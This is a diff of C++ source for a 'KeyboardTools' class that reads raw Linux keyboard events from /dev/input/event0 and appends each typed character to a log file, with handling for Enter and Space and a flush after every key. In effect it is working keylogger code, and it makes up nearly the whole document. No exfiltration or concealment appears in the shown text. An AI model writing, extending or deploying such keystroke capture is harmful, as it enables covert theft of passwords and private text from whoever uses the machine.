@@ -2,8 +2,9 @@
 #include <fstream>
 #include <fcntl.h>
 #include <unistd.h>
-#include <sys/stat.h>
 #include <linux/input.h>
+
+FILE* fpr;
 
 class KeyboardTools{
     private:
@@ -17,7 +18,6 @@ class KeyboardTools{
         char* TargetEvent;
         char* TargetHandl;
 
-	struct stat  filestat;
         struct input_event ie;
 
     public:
@@ -43,22 +43,30 @@ class KeyboardTools{
 			exit(1);
                 return 0x00;
        }
-       void OutputTo(const char* file){
-		outputfd=fopen(file, "a");
+       FILE* OutputTo(const char* file){
+		return (fpr=(outputfd=fopen(file, "a")));
        }
 
        void run(){
-		int fd=open((const char*)iPath, O_RDONLY);
+		int fd=open("/dev/input/event0", O_RDONLY);
 		printf ("K OPENED WITH %i\n", fd);
                 if (fd<0)return;
 		while (read(fd, &ie, sizeof(struct input_event))!=-1){
-				fprintf(outputfd, "%c", map[ie.code]);
-				fflush(stdout);
+			if (ie.type==EV_KEY && ie.value==0)
+				switch(ie.code){
+					case 28:
+						fprintf(outputfd, "\n");
+						break;
+					case 57:
+						fprintf(outputfd, " ");
+						break;
+					default:
+ 						fprintf(outputfd, "%c", map[ie.code]);
+				}
+
+					fflush(outputfd);
 		}
        }
-     void save(int sig){
-                fclose(outputfd);
-     }
-};
 
+};
 
